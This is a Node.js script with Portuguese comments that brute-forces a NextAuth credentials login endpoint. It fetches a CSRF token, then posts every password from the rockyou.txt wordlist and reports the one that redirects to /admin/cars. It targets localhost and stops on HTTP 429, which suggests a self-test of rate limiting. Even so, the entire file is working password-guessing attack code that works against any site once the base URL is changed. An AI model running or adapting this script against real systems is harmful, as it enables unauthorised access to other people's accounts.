import fs from "fs";

const data = fs.readFileSync("rockyou.txt", "utf-8");
const wordlist = data.split("\n").map(p => p.trim()).filter(Boolean);

const BASE = "http://localhost:3000";

// 1. Pega o CSRF token que o NextAuth exige
async function getCsrfToken() {
  const res = await fetch(`${BASE}/api/auth/csrf`);
  const json = await res.json();
  return json.csrfToken;
}

async function attack() {
  console.log(`Carregadas ${wordlist.length} senhas\n`);

  const csrfToken = await getCsrfToken();
  console.log(`CSRF token obtido: ${csrfToken}\n`);

  let n = 0;
  for (const pwd of wordlist) {
    n++;
    const res = await fetch(`${BASE}/api/auth/callback/credentials`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        password: pwd,
        csrfToken,         // <-- obrigatório no NextAuth
        redirect: "false",
        json: "true",
      }),
      redirect: "manual",
    });

    const status = res.status;
    const location = res.headers.get("location") ?? "";

    // NextAuth redireciona para /admin/cars em sucesso, ou para ?error= em falha
    const success = location.includes("/admin/cars") && !location.includes("error");

    console.log(`[${n}] "${pwd}" → ${status} ${location}`);

    if (success) {
      console.log(`\n✅ SENHA ENCONTRADA: "${pwd}"`);
      break;
    }

    // Se começar a receber 429, o rate limiting está funcionando
    if (status === 429) {
      console.log("\n🛡️ Rate limiting ativo — bloqueado após", n, "tentativas");
      break;
    }
  }
}

attack();